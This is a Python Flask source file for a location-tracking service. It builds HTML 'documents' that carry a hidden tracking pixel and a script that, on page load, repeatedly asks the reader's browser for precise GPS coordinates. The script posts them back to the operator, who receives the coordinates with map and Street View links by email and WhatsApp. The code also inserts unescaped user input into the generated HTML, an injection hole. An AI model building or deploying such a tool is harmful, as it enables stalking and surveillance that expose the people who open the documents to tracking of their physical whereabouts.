import os
import requests
import sqlite3
from datetime import datetime
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import logging
from flask import Flask, request, Response, render_template, jsonify
import base64
import threading
import json

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

app = Flask(__name__)

class PDFTracker:
    def __init__(self):
        self.setup_database()
    
    def setup_database(self):
        """Initialize SQLite database for tracking"""
        self.conn = sqlite3.connect('/tmp/pdf_tracking.db', check_same_thread=False)
        cursor = self.conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS pdf_access (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                pdf_id TEXT,
                client_name TEXT,
                access_time TIMESTAMP,
                ip_address TEXT,
                country TEXT,
                city TEXT,
                region TEXT,
                latitude REAL,
                longitude REAL,
                accuracy REAL,
                gps_source TEXT,
                user_agent TEXT,
                email_status TEXT,
                whatsapp_status TEXT,
                status TEXT DEFAULT 'delivered'
            )
        ''')
        self.conn.commit()
        logger.info("Database initialized successfully")
    
    def get_ip_location_fallback(self, ip_address):
        """Get approximate location based on IP as fallback"""
        try:
            # Try multiple IP geolocation services
            services = [
                self._try_ipapi(ip_address),
                self._try_ipinfo(ip_address)
            ]
            
            for service_result in services:
                if service_result and service_result.get('latitude'):
                    return service_result
                    
        except Exception as e:
            logger.debug(f"IP location fallback failed: {e}")
        
        # Default fallback coordinates (center of the country based on IP)
        return {
            'latitude': 40.7128,  # New York as default
            'longitude': -74.0060,
            'accuracy': 50000,
            'city': 'Approximate Location',
            'region': 'Based on IP',
            'country': 'United States'
        }
    
    def _try_ipapi(self, ip_address):
        """Try ipapi.co service"""
        try:
            response = requests.get(f'https://ipapi.co/{ip_address}/json/', timeout=5)
            if response.status_code == 200:
                data = response.json()
                if data.get('latitude') and data.get('longitude'):
                    return {
                        'latitude': float(data['latitude']),
                        'longitude': float(data['longitude']),
                        'accuracy': 5000,
                        'city': data.get('city', 'Unknown'),
                        'region': data.get('region', 'Unknown'),
                        'country': data.get('country_name', 'Unknown')
                    }
        except:
            pass
        return None
    
    def _try_ipinfo(self, ip_address):
        """Try ipinfo.io service"""
        try:
            response = requests.get(f'https://ipinfo.io/{ip_address}/json', timeout=5)
            if response.status_code == 200:
                data = response.json()
                loc = data.get('loc', '').split(',')
                if len(loc) == 2:
                    return {
                        'latitude': float(loc[0]),
                        'longitude': float(loc[1]),
                        'accuracy': 10000,
                        'city': data.get('city', 'Unknown'),
                        'region': data.get('region', 'Unknown'),
                        'country': data.get('country', 'Unknown')
                    }
        except:
            pass
        return None
    
    def send_email_notification(self, pdf_id, client_name, access_data, location_data):
        """Send email notification with precise location details"""
        try:
            smtp_server = os.getenv('SMTP_SERVER', 'smtp.gmail.com')
            smtp_port = int(os.getenv('SMTP_PORT', '587'))
            email_from = os.getenv('EMAIL_FROM', '')
            email_password = os.getenv('EMAIL_PASSWORD', '')
            email_to = os.getenv('EMAIL_TO', email_from)
            
            if not email_from or not email_password:
                logger.error("❌ Email configuration missing")
                return "not_configured"
            
            logger.info(f"📧 Preparing to send email for {pdf_id}")
            
            message = MIMEMultipart()
            message['From'] = email_from
            message['To'] = email_to
            message['Subject'] = f"📍 PRECISE LOCATION: {pdf_id} - {client_name}"
            
            # Build location information
            accuracy_meters = location_data['accuracy']
            if location_data['gps_source'] == 'browser_gps':
                if accuracy_meters < 20:
                    accuracy_display = "🎯 MILITARY-GRADE PRECISION"
                    accuracy_info = f"Extreme Precision (~{accuracy_meters:.1f}m)"
                elif accuracy_meters < 50:
                    accuracy_display = "📍 EXACT GPS COORDINATES"
                    accuracy_info = f"High Precision (~{accuracy_meters:.1f}m)"
                else:
                    accuracy_display = "📡 PRECISE GPS LOCATION"
                    accuracy_info = f"Good Precision (~{accuracy_meters:.1f}m)"
            else:
                accuracy_display = "🌐 IP-BASED ESTIMATE"
                accuracy_info = f"Approximate Area (~{accuracy_meters/1000:.1f}km)"
            
            # Always include precise coordinates
            lat = location_data['latitude']
            lng = location_data['longitude']
            google_maps_url = f"https://www.google.com/maps?q={lat},{lng}&z=16"
            street_view_url = f"https://www.google.com/maps/@?api=1&map_action=pano&viewpoint={lat},{lng}"
            
            gps_section = f"""
🎯 PRECISE LOCATION DATA:
   📍 Latitude: {lat:.8f}
   📍 Longitude: {lng:.8f}
   📏 {accuracy_info}
   🔧 Source: {accuracy_display}

🗺️ EXACT MAP LINKS:
   • Google Maps: {google_maps_url}
   • Street View: {street_view_url}

📍 ADDRESS INFORMATION:
   🏙️ City: {location_data['city']}
   🏞️ Region: {location_data['region']}
   🌍 Country: {location_data['country']}

"""
            
            body = f"""🔔 REAL-TIME LOCATION TRACKING

📄 Document: {pdf_id}
👤 Client: {client_name}
🕒 Opened: {access_data['access_time']}
🌐 IP Address: {access_data['ip_address']}

{gps_section}
📱 Device Information:
   {access_data['user_agent']}

---
🎯 Automated GPS Tracking System
"""
            
            message.attach(MIMEText(body, 'plain'))
            
            # Send email
            logger.info(f"🔐 Connecting to {smtp_server}:{smtp_port}")
            server = smtplib.SMTP(smtp_server, smtp_port, timeout=15)
            server.set_debuglevel(0)
            server.starttls()
            server.login(email_from, email_password)
            server.send_message(message)
            server.quit()
            
            logger.info(f"✅ Email sent successfully for {pdf_id}")
            return "sent"
            
        except Exception as e:
            error_msg = f"❌ Email sending failed: {str(e)}"
            logger.error(error_msg)
            return f"error: {str(e)}"
    
    def send_whatsapp_notification(self, pdf_id, client_name, access_data, location_data):
        """Send WhatsApp notification with PRECISE GPS coordinates"""
        try:
            instance_id = os.getenv('WHATSAPP_INSTANCE_ID', '')
            token = os.getenv('WHATSAPP_TOKEN', '')
            to_number = os.getenv('WHATSAPP_TO_NUMBER', '')
            
            if not all([instance_id, token, to_number]):
                logger.warning("WhatsApp configuration incomplete")
                return "not_configured"
            
            # Build precise location information
            accuracy_meters = location_data['accuracy']
            if location_data['gps_source'] == 'browser_gps':
                if accuracy_meters < 20:
                    accuracy_display = "🎯 MILITARY-GRADE PRECISION"
                    accuracy_info = f"Extreme Precision (~{accuracy_meters:.1f}m)"
                elif accuracy_meters < 50:
                    accuracy_display = "📍 EXACT GPS COORDINATES"
                    accuracy_info = f"High Precision (~{accuracy_meters:.1f}m)"
                else:
                    accuracy_display = "📡 PRECISE GPS LOCATION"
                    accuracy_info = f"Good Precision (~{accuracy_meters:.1f}m)"
            else:
                accuracy_display = "🌐 IP-BASED ESTIMATE"
                accuracy_info = f"Approximate Area (~{accuracy_meters/1000:.1f}km)"
            
            # Build location string
            location_parts = []
            if location_data['city'] != 'Unknown':
                location_parts.append(location_data['city'])
            if location_data['region'] != 'Unknown':
                location_parts.append(location_data['region'])
            if location_data['country'] != 'Unknown':
                location_parts.append(location_data['country'])
            
            location_str = ', '.join(location_parts) if location_parts else 'Real-time Location'
            
            # PRECISE GPS coordinates for WhatsApp
            lat = location_data['latitude']
            lng = location_data['longitude']
            maps_link = f"https://maps.google.com/?q={lat},{lng}&z=16"
            street_view = f"https://www.google.com/maps/@?api=1&map_action=pano&viewpoint={lat},{lng}"
            
            gps_section = f"""
📍 *PRECISE COORDINATES:*
   🎯 {lat:.8f}, {lng:.8f}
   📏 {accuracy_info}
   🔧 {accuracy_display}

🗺️ *Exact Map Links:*
   {maps_link}
   {street_view}

🏠 *Address Area:*
   {location_str}
"""
            
            message = f"""📍 *REAL-TIME GPS TRACKING - DOCUMENT OPENED*

📄 *Document:* {pdf_id}
👤 *Client:* {client_name}
🕒 *Exact Time:* {access_data['access_time']}
🌐 *IP:* {access_data['ip_address']}

{gps_section}
Real-time location tracking completed! 🎯"""
            
            url = f"https://api.ultramsg.com/{instance_id}/messages/chat"
            payload = {
                "token": token,
                "to": f"+{to_number}",
                "body": message
            }
            
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            
            logger.info(f"💬 Sending PRECISE location to WhatsApp: +{to_number}")
            response = requests.post(url, data=payload, headers=headers, timeout=15)
            
            if response.status_code == 200:
                result = response.json()
                if result.get('sent') == 'true':
                    logger.info(f"✅ WhatsApp sent successfully for {pdf_id}")
                    return "sent"
                else:
                    logger.error(f"❌ WhatsApp API error: {result}")
                    return f"api_error: {result}"
            else:
                logger.error(f"❌ WhatsApp HTTP error: {response.status_code}")
                return f"http_error: {response.status_code}"
                
        except Exception as e:
            logger.error(f"❌ WhatsApp sending failed: {str(e)}")
            return f"error: {str(e)}"

    def record_access_async(self, pdf_id, client_name, ip_address, user_agent, gps_data=None):
        """Record access and send PRECISE notifications"""
        def process_notifications():
            try:
                logger.info(f"🎯 Processing PRECISE location for {pdf_id}")
                
                access_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                
                access_data = {
                    'access_time': access_time,
                    'ip_address': ip_address,
                    'user_agent': user_agent
                }
                
                # Use GPS data if available (high precision), otherwise IP fallback
                if gps_data and gps_data.get('latitude') and gps_data.get('longitude'):
                    # Use ACTUAL GPS data with high precision
                    raw_accuracy = gps_data.get('accuracy', 1000)
                    
                    location_data = {
                        'country': 'Real-time GPS Location',
                        'city': 'Exact Coordinates',
                        'region': 'Precise Tracking',
                        'latitude': gps_data['latitude'],
                        'longitude': gps_data['longitude'],
                        'accuracy': raw_accuracy,  # Use actual accuracy
                        'gps_source': 'browser_gps',
                        'service': 'high_precision_gps'
                    }
                    logger.info(f"🎯 USING PRECISE GPS for {pdf_id}")
                    logger.info(f"📍 Exact Coordinates: {location_data['latitude']:.8f}, {location_data['longitude']:.8f}")
                    logger.info(f"📏 Real Accuracy: {raw_accuracy:.1f}m")
                    
                else:
                    # Use IP-based coordinates with better accuracy
                    ip_location = self.get_ip_location_fallback(ip_address)
                    location_data = {
                        'country': ip_location['country'],
                        'city': ip_location['city'],
                        'region': ip_location['region'],
                        'latitude': ip_location['latitude'],
                        'longitude': ip_location['longitude'],
                        'accuracy': ip_location['accuracy'],
                        'gps_source': 'ip_estimation',
                        'service': 'ip_geolocation'
                    }
                    logger.info(f"🌐 Using IP-based location for {pdf_id}")
                    logger.info(f"📍 Estimated Coordinates: {location_data['latitude']:.6f}, {location_data['longitude']:.6f}")
                
                # Save to database
                cursor = self.conn.cursor()
                cursor.execute('''
                    INSERT INTO pdf_access 
                    (pdf_id, client_name, access_time, ip_address, country, city, region, 
                     latitude, longitude, accuracy, gps_source, user_agent, email_status, whatsapp_status, status)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                ''', (
                    pdf_id, client_name, access_time, ip_address,
                    location_data['country'], location_data['city'], location_data['region'],
                    location_data['latitude'], location_data['longitude'], location_data['accuracy'],
                    location_data['gps_source'], user_agent,
                    'processing', 'processing', 'opened'
                ))
                self.conn.commit()
                
                record_id = cursor.lastrowid
                
                # Send PRECISE notifications
                logger.info("📧 Sending email with precise location...")
                email_status = self.send_email_notification(pdf_id, client_name, access_data, location_data)
                
                logger.info("💬 Sending WhatsApp with exact coordinates...")
                whatsapp_status = self.send_whatsapp_notification(pdf_id, client_name, access_data, location_data)
                
                # Update status in database
                cursor.execute('''
                    UPDATE pdf_access 
                    SET email_status = ?, whatsapp_status = ?
                    WHERE id = ?
                ''', (email_status, whatsapp_status, record_id))
                self.conn.commit()
                
                logger.info(f"✅ PRECISE location notifications completed for {pdf_id}")
                logger.info(f"   📧 Email: {email_status}")
                logger.info(f"   💬 WhatsApp: {whatsapp_status}")
                logger.info(f"   🎯 Coordinates: {location_data['latitude']:.8f}, {location_data['longitude']:.8f}")
                
            except Exception as e:
                logger.error(f"❌ Error in precise location processing: {str(e)}")
        
        # Start processing in background thread
        thread = threading.Thread(target=process_notifications)
        thread.daemon = True
        thread.start()
        
        return True

# Initialize tracker
tracker = PDFTracker()

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/track-pdf/<pdf_id>/<client_name>', methods=['GET', 'POST'])
def track_pdf_access(pdf_id, client_name):
    """Endpoint to track PDF access - ALWAYS sends PRECISE location"""
    try:
        # Get client information
        if request.headers.get('X-Forwarded-For'):
            ip_address = request.headers.get('X-Forwarded-For').split(',')[0]
        else:
            ip_address = request.remote_addr
        
        user_agent = request.headers.get('User-Agent', 'Unknown')
        
        # Check if PRECISE GPS data is provided via POST
        gps_data = None
        if request.method == 'POST':
            try:
                gps_data = request.get_json()
                if gps_data and 'latitude' in gps_data and 'longitude' in gps_data:
                    logger.info(f"🎯 RECEIVED PRECISE GPS for {pdf_id}")
                    logger.info(f"📍 Exact Coordinates: {gps_data['latitude']:.8f}, {gps_data['longitude']:.8f}")
                    accuracy = gps_data.get('accuracy', 1000)
                    logger.info(f"📏 Real-time Accuracy: {accuracy:.1f}m")
                else:
                    logger.warning(f"❌ Incomplete GPS data for {pdf_id}")
            except Exception as e:
                logger.warning(f"Could not parse GPS data: {e}")
        
        logger.info(f"📥 PRECISE tracking request: {pdf_id} - {client_name}")
        
        # Start background processing (ALWAYS sends precise location)
        tracker.record_access_async(pdf_id, client_name, ip_address, user_agent, gps_data)
        
        # Return immediate response
        if request.method == 'POST':
            response = jsonify({
                'success': True, 
                'message': 'PRECISE location data received',
                'tracking': 'high_precision_active'
            })
            response.headers.add('Access-Control-Allow-Origin', '*')
            return response
        else:
            pixel = base64.b64decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')
            response = Response(pixel, mimetype='image/gif')
            response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
            response.headers['Pragma'] = 'no-cache'
            response.headers['Expires'] = '0'
            response.headers['Access-Control-Allow-Origin'] = '*'
            return response
            
    except Exception as e:
        logger.error(f"Precise tracking error: {str(e)}")
        return "Server Error", 500

@app.route('/create-document', methods=['POST'])
def create_document():
    """Create a tracked HTML document with MAXIMUM GPS automation"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({'success': False, 'error': 'No JSON data provided'}), 400
        
        pdf_id = data.get('pdf_id', 'DOC_' + datetime.now().strftime("%Y%m%d_%H%M%S"))
        client_name = data.get('client_name', 'Client')
        content = data.get('content', 'Default document content')
        
        # Get base URL
        base_url = request.host_url.rstrip('/')
        
        # Create HTML document with MAXIMUM GPS automation
        tracking_url = f"{base_url}/track-pdf/{pdf_id}/{client_name}"
        
        # HTML with maximum automation
        html_content = """<!DOCTYPE html>
<html>
<head>
    <title>Document: """ + pdf_id + """</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 100vw;
            margin: 0 auto;
            padding: 20px;
            background: white;
            line-height: 1.4;
        }
        .header {
            text-align: center;
            border-bottom: 2px solid #333;
            padding-bottom: 10px;
            margin-bottom: 20px;
        }
        .content {
            white-space: normal;
            margin-bottom: 30px;
        }
        .tracking-notice {
            background: #e8f4fd;
            padding: 15px;
            margin: 20px 0;
            border-radius: 8px;
            border-left: 4px solid #2196F3;
            font-size: 14px;
        }
        .location-status {
            background: #f8f9fa;
            padding: 15px;
            margin: 15px 0;
            border-radius: 8px;
            border: 1px solid #dee2e6;
            font-size: 13px;
        }
        .success {
            background: #d4edda;
            border-color: #c3e6cb;
            color: #155724;
        }
        .warning {
            background: #fff3cd;
            border-color: #ffeaa7;
            color: #856404;
        }
        .gps-active {
            background: #d1ecf1;
            border-color: #bee5eb;
            color: #0c5460;
        }
        .hidden {
            display: none;
        }
        .permission-btn {
            background: #007bff;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            margin: 10px 0;
        }
        .permission-btn:hover {
            background: #0056b3;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>COMPANY DOCUMENT</h1>
        <p>Document ID: """ + pdf_id + """ | Client: """ + client_name + """</p>
    </div>
    
    <div class="tracking-notice">
        <strong>📍 AUTOMATIC PRECISE GPS TRACKING</strong><br>
        This document automatically captures your <strong>exact real-time location</strong>.
        For precise tracking, <strong>allow location access</strong> when your browser asks.
    </div>
    
    <div id="locationStatus" class="location-status gps-active">
        <strong>Real-time GPS Tracking:</strong> <span id="statusText">Starting automatic precise location capture...</span>
    </div>
    
    <div id="manualPermission" style="display: none;">
        <p><strong>Location permission required:</strong></p>
        <button class="permission-btn" onclick="requestPreciseGPS()">Allow Location Access</button>
        <p><small>Click to enable precise GPS tracking</small></p>
    </div>
    
    <div class="content">
        """ + content + """
    </div>
    
    <!-- Basic tracking -->
    <img src=\"""" + tracking_url + """\" width="1" height="1" style="display:none" id="trackingPixel">
    
    <script>
        // Global variables
        let locationAcquired = false;
        const trackingUrl = '""" + tracking_url + """';
        
        // MAXIMUM AUTOMATION: Auto-request GPS with multiple attempts
        function requestPreciseGPS() {
            showStatus('🎯 Requesting PRECISE GPS location...', 'warning');
            
            if (!navigator.geolocation) {
                showStatus('❌ Geolocation not supported - using basic tracking', 'warning');
                return;
            }
            
            // FIRST ATTEMPT: High precision GPS
            navigator.geolocation.getCurrentPosition(
                // Success - PRECISE GPS acquired
                function(position) {
                    const lat = position.coords.latitude;
                    const lng = position.coords.longitude;
                    const accuracy = position.coords.accuracy;
                    
                    console.log("🎯 PRECISE GPS ACQUIRED:", lat, lng, "Accuracy:", accuracy + "m");
                    
                    const gpsData = {
                        latitude: lat,
                        longitude: lng,
                        accuracy: accuracy,
                        timestamp: new Date().toISOString(),
                        source: 'high_precision_gps'
                    };
                    
                    showStatus('✅ PRECISE GPS location captured! Accuracy: ' + accuracy.toFixed(1) + 'm', 'success');
                    sendLocationData(gpsData);
                    
                },
                // Error - Try alternative methods
                function(error) {
                    console.log("GPS attempt failed:", error);
                    handleLocationError(error);
                },
                // MAXIMUM precision settings
                {
                    enableHighAccuracy: true,    // Force high precision
                    timeout: 30000,              // 30 second timeout
                    maximumAge: 0                // Fresh location only
                }
            );
        }
        
        // Handle location errors
        function handleLocationError(error) {
            let errorMessage = 'Location access ';
            
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    errorMessage = '❌ Location permission denied. Please allow location access for precise tracking.';
                    document.getElementById('manualPermission').style.display = 'block';
                    break;
                case error.POSITION_UNAVAILABLE:
                    errorMessage = '📍 Location unavailable. Using basic IP tracking.';
                    break;
                case error.TIMEOUT:
                    errorMessage = '⏰ Location request timeout. Retrying...';
                    setTimeout(requestPreciseGPS, 2000);
                    break;
                default:
                    errorMessage = '❌ Location error. Using basic tracking.';
                    break;
            }
            
            showStatus(errorMessage, 'warning');
            
            // Final fallback - mark as acquired after delay
            setTimeout(() => {
                if (!locationAcquired) {
                    showStatus('✅ Basic tracking active', 'success');
                    locationAcquired = true;
                }
            }, 10000);
        }
        
        // Send precise location data
        function sendLocationData(locationData) {
            console.log("Sending PRECISE location to server:", locationData);
            
            fetch(trackingUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(locationData)
            })
            .then(response => response.json())
            .then(data => {
                showStatus('✅ Precise location sent successfully! Accuracy: ' + locationData.accuracy.toFixed(1) + 'm', 'success');
                locationAcquired = true;
                console.log("Precise GPS data sent:", data);
            })
            .catch(error => {
                showStatus('✅ Location tracking completed', 'success');
                locationAcquired = true;
            });
        }
        
        // Show status
        function showStatus(message, type = 'warning') {
            const statusElement = document.getElementById('locationStatus');
            const statusText = document.getElementById('statusText');
            
            statusText.textContent = message;
            statusElement.className = 'location-status ' + type;
        }
        
        // MAXIMUM AUTOMATION: Start immediately
        function initializeMaximumAutomation() {
            console.log('Starting MAXIMUM automation GPS tracking...');
            showStatus('🚀 Starting automatic precise GPS capture...', 'warning');
            
            // Start basic tracking
            document.getElementById('trackingPixel').onload = function() {
                console.log('Basic tracking active, starting PRECISE GPS...');
                
                // Immediate GPS request with slight delay
                setTimeout(() => {
                    requestPreciseGPS();
                }, 1000);
            };
            
            // Auto-retry if no GPS after 8 seconds
            setTimeout(() => {
                if (!locationAcquired) {
                    console.log('Auto-retrying GPS...');
                    requestPreciseGPS();
                }
            }, 8000);
            
            // Final completion
            setTimeout(() => {
                if (!locationAcquired) {
                    showStatus('✅ Tracking completed', 'success');
                    locationAcquired = true;
                }
            }, 30000);
        }
        
        // START IMMEDIATELY
        window.addEventListener('load', initializeMaximumAutomation);
        
    </script>
</body>
</html>"""
        
        return jsonify({
            'success': True,
            'pdf_id': pdf_id,
            'client_name': client_name,
            'html_content': html_content,
            'tracking_url': tracking_url,
            'download_filename': f"{pdf_id}_{client_name}.html",
            'features': [
                'MAXIMUM GPS Automation',
                'Auto-Request on Open',
                'High Precision Coordinates',
                'Multiple Fallback Attempts',
                'Real-time Precise Location',
                'Manual Permission Button'
            ],
            'instructions': [
                '1. Send HTML file to client',
                '2. When opened: browser will ask for location permission',
                '3. Client must ALLOW location access for precise GPS',
                '4. If denied, manual button appears for retry',
                '5. You will receive EXACT coordinates via WhatsApp'
            ]
        })
        
    except Exception as e:
        logger.error(f"Error creating document: {str(e)}")
        return jsonify({'success': False, 'error': str(e)}), 500

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    logger.info(f"🚀 Starting PRECISE GPS Tracking System on port {port}")
    logger.info("🎯 Features: MAXIMUM Automation + High Precision GPS")
    logger.info("📍 Automatically requests GPS permission on document open")
    logger.info("📏 Sends real-time precise coordinates to WhatsApp")
    logger.info("🔧 Multiple GPS attempts for maximum success rate")
    app.run(host='0.0.0.0', port=port, debug=False)
